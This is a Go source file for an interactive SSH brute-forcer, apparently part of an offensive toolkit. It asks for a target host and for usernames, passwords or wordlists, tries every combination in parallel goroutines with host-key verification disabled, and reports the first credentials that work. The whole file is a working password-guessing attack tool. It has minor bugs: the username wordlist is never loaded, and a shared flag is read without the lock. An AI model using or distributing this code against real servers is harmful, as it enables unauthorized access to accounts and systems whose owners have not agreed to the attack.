package bruteforce

import (
	"ascii"
	"console"
	"files"

	"fmt"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var rightUsername string = ""
var rightPassword string = ""

var mtx sync.Mutex
var stopped bool = false

func bruteforce(host string, usernames *[]string, passwords *[]string) {
	var wg sync.WaitGroup

	for _, username := range *usernames {
		for _, password := range *passwords {
			if !stopped {
				wg.Add(1)
				go tryCombination(&wg, host, username, password)
			}
		}
	}

	wg.Wait()
}

func connect(host string, username string, password string) error {
	config := getConfig(username, password)
	conn, err := ssh.Dial("tcp", host, config)
	if err != nil {
		return err
	}

	conn.Close()
	return nil
}

func getConfig(username string, password string) *ssh.ClientConfig {
	return &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(2 * time.Second),
	}
}

func tryCombination(wg *sync.WaitGroup, host string, username string, password string) {	
	defer wg.Done()

	if !stopped {
		if err := connect(host, username, password); err != nil {
			return
		}

		mtx.Lock()

		rightUsername = username
		rightPassword = password
		stopped = true

		mtx.Unlock()
		
	}
}

func Initialize() {
	var host string
	var usernameWListPath string
	var passwordWListPath string

	passwordWList := make([]string, 1)
	usernameWList := make([]string, 1)

	ascii.Bruteforce()
	console.Println(console.BoldRed, "\t\t\tAn SSH Bruteforcer")
	
	console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter the target's address: ")
	fmt.Scanf("%s", &host)

	console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter username (leave blank if you don't know it): ")
	fmt.Scanf("%s", &usernameWList[0])

	if (usernameWList[0] == "") {
		console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter usernames wordlist's path: ")
		fmt.Scanf("%s", &usernameWListPath)
	}

	console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter password (leave blank if you don't know it): ")
	fmt.Scanf("%s", &passwordWList[0])

	if (passwordWList[0] == "") {
		console.Print(console.BoldBlue, "[+] " + console.Reset + "Enter passwords worlist's path: ")
		fmt.Scanf("%s", &passwordWListPath)
		passwordWList = files.ReadLineByLine(passwordWListPath, true)
	}

	bruteforce(host, &usernameWList, &passwordWList)

	if rightUsername == "" && rightPassword == "" {
		console.Println(console.BoldRed, "\nCouldn't find username and password")
	} else {
		console.Println(console.BoldGreen, "\nCombination found [%s: %s]", rightUsername, rightPassword)
	}
	
	fmt.Scanln()
	return
}